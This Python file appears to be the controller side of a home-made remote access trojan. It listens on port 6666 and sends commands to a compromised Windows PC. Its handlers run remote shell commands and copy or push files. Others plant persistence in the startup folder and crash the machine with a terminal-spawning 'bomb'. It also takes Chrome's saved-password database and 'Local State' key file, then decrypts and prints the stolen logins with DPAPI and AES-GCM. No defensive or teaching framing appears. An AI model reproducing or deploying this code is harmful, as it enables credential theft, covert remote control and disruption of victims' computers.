import socket, os, time, glob
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

socket1 = socket.socket()
print ('Socket successfully created')

port = 6666

socket1.bind(('', port))
print (f'socket binded to {port}')

socket1.listen(5)
print ('socket is listening')

#changes the formatting of an output
def desc(x):
    return f'\033[0m{x}\033[2m'

#testing function
def test():
    with open(r"C:\Users\Joe\.vscode\code files\rat\video1.mp4", 'wb') as file:
        filechunk = int(client.recv(2048).decode())
        client.send('asd;flkj'.encode())
        file.write(client.recv(filechunk))

while True:
    client, address = socket1.accept()    
    print ('Got connection from', address)

    print(client.recv(1024).decode())

    client.send('host connected to client'.encode())

    messagesend = ''
    print('Messenger')
    while not messagesend == 'stop':
        messagesend = input()
        client.send(messagesend.encode())

        if messagesend == 'help':
            print(f'\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n{desc("Help Menu:")}\n\n{desc("help:")} prints the help menu\n{desc("stop:")} disconnects from the current session (WAIT AT LEAST ONE SECOND BEFORE RECONNECTING)\n{desc("shell:")} executes a command on the connected pc\n{desc("testfile:")} (DO NOT USE OUTSIDE OF FEATURE TESTING) sends video.mp4 from connected pc to host\n{desc("manualcopy:")} manually copies the file to the startup directory\n{desc("bomb:")} infinetly opens a terminal window untill the computer crashes\n{desc("chrome:")} copies all chrome saved passwords as well as the "Local State" file to decode later\n{desc("decode chrome:")} decodes the chrome passwords that have been copied (requires the "chrome" command to be executed as a prerequisite)\n{desc("copy:")} copies a specific file from the connected pc\n{desc("copyall:")} copies all files in a folder on the connected pc\033[0m')
        if messagesend == 'testfile':
            test()
        if messagesend == 'shell':
            shellcommand = input('Command To Execute:\n')
            if shellcommand == '' or shellcommand == None:
                shellcommand = ('echo DO NOT LEAVE THE COMMAND BLANK')
            client.send(shellcommand.encode())
            outputlen = int(client.recv(1024).decode())
            client.send('asd;flkj'.encode())
            print(client.recv(outputlen).decode())
        if messagesend == 'bomb':
            if input('Are You Sure?\n(yes/no)\n') == 'yes':
                client.send('yes'.encode())
            else:
                client.send('no'.encode())
        if messagesend == 'chrome':
                data_len = int(client.recv(1024).decode())
                print(data_len)
                client.send('data received'.encode())

                for i in range(data_len):
                    #change the directory once done
                    with open(rf"C:\Users\Joe\.vscode\code files\rat\Pt.2\user_data\data{i}", 'wb') as file:
                        filechunk = int(client.recv(1024).decode())
                        client.send('asdlf;jasd;k'.encode())
                        file.write(client.recv(filechunk))

                for file in glob.glob(rf'C:\Users\Joe\.vscode\code files\rat\Pt.2\user_data\*', recursive=True):
                    print(file)

                    if f'data{data_len - 1}' in file:
                        try:
                            os.remove(r'C:\Users\Joe\.vscode\code files\rat\Pt.2\user_data\Local State')
                        except:
                            print("Can't Remove 'Local State'")

                        os.rename(file, r'C:\Users\Joe\.vscode\code files\rat\Pt.2\user_data\Local State')

        if messagesend == 'decode chrome':
            def chrome_date_and_time(chrome_data):
                # Chrome_data format is 'year-month-date 
                # hr:mins:seconds.milliseconds
                # This will return datetime.datetime Object
                return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
            
            
            def fetching_encryption_key():
                # Local_computer_directory_path will look 
                # like this below
                # C: => Users => <Your_Name> => AppData =>
                # Local => Google => Chrome => User Data =>
                # Local State
                local_computer_directory_path = os.path.join(
                os.environ["USERPROFILE"], ".vscode", "code files", "rat", "Pt.2", 
                "user_data", "Local State")
                
                with open(local_computer_directory_path, "r", encoding="utf-8") as f:
                    local_state_data = f.read()
                    local_state_data = json.loads(local_state_data)
            
                # decoding the encryption key using base64
                encryption_key = base64.b64decode(
                local_state_data["os_crypt"]["encrypted_key"])
                
                # remove Windows Data Protection API (DPAPI) str
                encryption_key = encryption_key[5:]
                
                # return decrypted key
                return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
            
            
            def password_decryption(password, encryption_key):
                try:
                    iv = password[3:15]
                    password = password[15:]
                    
                    # generate cipher
                    cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
                    
                    # decrypt password
                    return cipher.decrypt(password)[:-16].decode()
                except:
                    
                    try:
                        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                    except:
                        return "No Passwords"
            
            
            def main():
                decodingfile = input('File to Decode:\n')
                key = fetching_encryption_key()
                db_path = rf'C:\Users\Joe\.vscode\code files\rat\Pt.2\user_data\{decodingfile}'
                filename = "ChromePasswords.db"
                shutil.copyfile(db_path, filename)
                
                # connecting to the database
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                
                # 'logins' table has the data
                cursor.execute(
                    "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
                    "order by date_last_used")
                
                # iterate over all rows
                for row in cursor.fetchall():
                    main_url = row[0]
                    login_page_url = row[1]
                    user_name = row[2]
                    decrypted_password = password_decryption(row[3], key)
                    date_of_creation = row[4]
                    last_usuage = row[5]
                    
                    if user_name or decrypted_password:
                        print(f"Main URL: {main_url}")
                        print(f"Login URL: {login_page_url}")
                        print(f"User name: {user_name}")
                        print(f"Decrypted Password: {decrypted_password}")
                    
                    else:
                        continue
                    
                    if date_of_creation != 86400000000 and date_of_creation:
                        print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
                    
                    if last_usuage != 86400000000 and last_usuage:
                        print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
                    print("=" * 100)
                cursor.close()
                db.close()
                
                try:
                    
                    # trying to remove the copied db file as 
                    # well from local computer
                    os.remove(filename)
                except:
                    pass
            
            
            main()
        if messagesend == 'copy':
            copypath = input('Path To Copy:\n')
            client.send(f'{copypath}'.encode())

            data_len = int(client.recv(1024).decode())
            print(data_len)
            client.send('data received'.encode())

            file_ext = []

            for i in range(data_len):
                file_ext.append(client.recv(1024).decode())
                client.send(str(file_ext[i]).encode())

            for i in range(data_len):
                #change the directory once done
                with open(rf'C:\Users\Joe\.vscode\code files\rat\Pt.2\copied\{i}{file_ext[i]}', 'wb') as file:
                    filechunk = int(client.recv(1024).decode())
                    client.send('asdlf;jasd;k'.encode())
                    file.write(client.recv(filechunk))
        if messagesend == 'copyall':
            copypath = input('Path To Copy:\n')
            client.send(f'{copypath}'.encode())

            data_len = int(client.recv(1024).decode())
            print(data_len)
            client.send('data received'.encode())

            file_ext = []

            for i in range(data_len):
                file_ext.append(client.recv(1024).decode())
                client.send(str(file_ext[i]).encode())

            for i in range(data_len):
                #change the directory once done
                with open(rf'C:\Users\Joe\.vscode\code files\rat\Pt.2\copied\{i}{file_ext[i]}', 'wb') as file:
                    filechunk = int(client.recv(1024).decode())
                    client.send('asdlf;jasd;k'.encode())
                    file.write(client.recv(filechunk))
        if messagesend == 'sendall':
            data = []
            file_ext = []

            filepath = input('File Path:\n')
            writingpath = input('Path To Write Files:\n')
            writingname = input('Name Of Files:\n')

            client.send(writingpath.encode())

            print(client.recv(1024).decode())

            client.send(writingname.encode())

            print(client.recv(1024).decode())

            for file in glob.glob(rf'{filepath}\*', recursive=True):
                print(file)
                file_name, file_ext1 = os.path.splitext(file)
                if not file_ext1 == '':
                    file_ext.append(file_ext1)
                try:
                    with open(file, 'rb'):
                        print(file)
                    data.append(file)
                except:
                    print("can't copy file")
            
            print(data)
            print(len(data))
        

            client.send(str(len(data)).encode())

            print(client.recv(1024).decode())

            for ext in file_ext:
                client.send(str(ext).encode())
                client.recv(1024).decode()

            for file in data:
                with open(file, 'rb') as readfile:
                    client.send(str(os.stat(file).st_size).encode())
                    client.recv(1024).decode()
                    client.send(readfile.read())
        if messagesend == 'send':
            data = []
            file_ext = []

            filepath = input('File Path:\n')
            writingpath = input('Path To Write File:\n')
            writingname = input('Name Of File:\n')

            client.send(writingpath.encode())

            print(client.recv(1024).decode())

            client.send(writingname.encode())

            print(client.recv(1024).decode())

            for file in glob.glob(rf'{filepath}', recursive=True):
                print(file)
                file_name, file_ext1 = os.path.splitext(file)
                if not file_ext1 == '':
                    file_ext.append(file_ext1)
                try:
                    with open(file, 'rb'):
                        print(file)
                    data.append(file)
                except:
                    print("can't copy file")
            
            print(data)
            print(len(data))
        

            client.send(str(len(data)).encode())

            print(client.recv(1024).decode())

            for ext in file_ext:
                client.send(str(ext).encode())
                client.recv(1024).decode()

            for file in data:
                with open(file, 'rb') as readfile:
                    client.send(str(os.stat(file).st_size).encode())
                    client.recv(1024).decode()
                    client.send(readfile.read())

    client.send('stop'.encode())
    client.close()
    break